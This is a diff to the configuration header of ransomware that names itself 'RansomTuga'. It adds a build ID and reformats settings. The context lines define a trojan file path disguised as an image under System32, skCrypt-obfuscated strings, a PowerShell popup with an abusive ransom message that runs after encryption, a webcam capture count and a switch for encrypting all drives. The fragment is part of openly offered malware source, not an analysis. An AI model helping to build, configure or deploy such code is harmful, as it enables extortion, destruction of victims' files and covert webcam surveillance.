@@ -45,9 +45,10 @@
 #define TROJANFILE      (string)skCrypt("C:\\Windows\\System32\\trojanFile.jpg")	// Filepath of the real program
 
 // Misc settings
+#define BUILD_ID			(string)skCrypt("test build") // Unique Identification of this build
 #define CUSTOM_COMMAND		(string)skCrypt("powershell -command \"Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('You have been fucked up by RansomTuga ransomware...', 'RansomTuga docet', 'OK', 'Error')\"")	// Custom command that runs after encryption
-#define NUMBER_RETRIES     3	// Maximum retries for decryptor
-#define MAX_PHOTOS         3	// Maximum number of webcam captures
+#define NUMBER_RETRIES		3	// Maximum retries for decryptor
+#define MAX_PHOTOS			3	// Maximum number of webcam captures
 
 // Enabling features
 #define ALL_DRIVES			false	// Enable or disable the encryption of all files in every drive
